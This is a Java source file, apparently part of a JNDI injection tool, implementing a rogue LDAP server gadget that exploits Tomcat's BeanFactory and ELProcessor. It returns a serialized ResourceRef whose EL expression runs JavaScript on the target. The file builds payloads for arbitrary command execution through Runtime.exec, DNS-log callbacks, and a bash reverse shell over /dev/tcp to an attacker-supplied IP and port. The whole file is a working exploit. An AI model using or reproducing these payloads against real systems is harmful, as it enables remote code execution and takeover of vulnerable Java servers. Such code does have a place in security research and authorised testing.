package net.roboterh.injector.gadgets;

import cn.hutool.http.HttpUtil;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.enums.PayloadEnum;
import net.roboterh.injector.servers.HTTPServer;
import net.roboterh.injector.utils.GadgetUtils;
import net.roboterh.injector.utils.PayloadUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Arrays;

/*
    Tomcat EL Way:
    Requirement:
        Tomcat 8+(catalina and el-api) or springboot1.2.x+ in classpath
    Explanation:
        1. set javaSerializedData to Serialized ResourceRef-object
        2. call NamingManger#getObjectInstance when ldap-client calls lookup
        3. call getObjectFactoryFromReference in function getObjectInstance to get the factory from Ref
        4. call org.apache.naming.factory.BeanFactory#getObjectInstance
        5. call setter method
 */
public class TomcatEL implements LDAPService {
    private static final Logger logger = LogManager.getLogger(TomcatEL.class);

    private PayloadEnum payload;
    private String[] params;
    private String replacement;
    private String payloadTemplate = "{" +
            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
            ".newInstance().getEngineByName(\"JavaScript\")" +
            ".eval(\"{replacement}\")" +
            "}";

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);

        generateHandler();

        try {
            logger.info(String.format("Send LDAP result for %s using TomcatEL Way ...", baseDN));

            String finalPayload = payloadTemplate.replace("{replacement}", replacement);
            // create ResourceRef
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                    true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "x=eval"));
            ref.add(new StringRefAddr("x", finalPayload));

            Entry entry = new Entry(baseDN);
            entry.addAttribute("javaClassName", "java.lang.Class");
            entry.addAttribute("javaSerializedData", GadgetUtils.serialize(ref));
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    @Override
    public void argsHandler(String baseDN) {
        int firstIndex = baseDN.indexOf("/");
        int secondIndex = baseDN.indexOf("/", firstIndex + 1);

        // obtain the value of Payload
        payload = PayloadEnum.valueOf(baseDN.substring(firstIndex + 1, secondIndex));

        // add params
        switch (payload.name()) {
            case "DnsLog":
            case "File":
                String link = baseDN.substring(baseDN.lastIndexOf("/") + 1);
                params = new String[]{link};
                break;
            case "Command":
                String cmd = PayloadUtils.getCmdFromBase(baseDN);
                params = new String[]{cmd};
                break;
            case "ReverseShell":
                params = PayloadUtils.getIpAndPortFromBase(baseDN);
                break;
        }
        logger.info(String.format("Received Payload is %s, params are %s", payload, Arrays.toString(params)));
    }

    @Override
    public void generateHandler() {
        try {
            TomcatELTemplate tomcatELTemplate = new TomcatELTemplate();
            switch (payload.name()) {
                case "DnsLog":
                    replacement = tomcatELTemplate.getDnsRequestCode(params[0]);
                    break;
                case "Command":
                    replacement = tomcatELTemplate.getExecCode(params[0]);
                    break;
                case "ReverseShell":
                    replacement = tomcatELTemplate.getReverseShellCode(params[0], params[1]);
                    break;
                case "File":
                    replacement = HttpUtil.get(HTTPServer.codeBase + params[0]);
                    break;
            }
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    /**
     * Script Template
     */
    private class TomcatELTemplate {
        public String getExecCode(String cmd) {
            // determine os using separator `/`
            String code = "var strs=new Array(3);\n" +
                    "        if(java.io.File.separator.equals('/')){\n" +
                    "            strs[0]='/bin/bash';\n" +
                    "            strs[1]='-c';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }else{\n" +
                    "            strs[0]='cmd';\n" +
                    "            strs[1]='/C';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }\n" +
                    "        java.lang.Runtime.getRuntime().exec(strs);";

            return code;
        }

        public String getDnsRequestCode(String dnslog){
            String code = "var str;\n" +
                    "            if(java.io.File.separator.equals('/')){\n" +
                    "                str = 'ping -c 1 " + dnslog + "';\n" +
                    "            }else{\n" +
                    "                str = 'nslookup " + dnslog + "';\n" +
                    "            }\n" +
                    "\n" +
                    "            java.lang.Runtime.getRuntime().exec(str);";

            return code;
        }

        public String getReverseShellCode(String ip, String port){
            int pt = Integer.parseInt(port);
            String code = "if(java.io.File.separator.equals('/')){\n" +
                    "                var cmds = new Array('/bin/bash', '-c', '/bin/bash -i >& /dev/tcp/" + ip + "/" + pt + "');\n" +
                    "                java.lang.Runtime.getRuntime().exec(cmds);\n" +
                    "            }";

            return code;
        }
    }
}
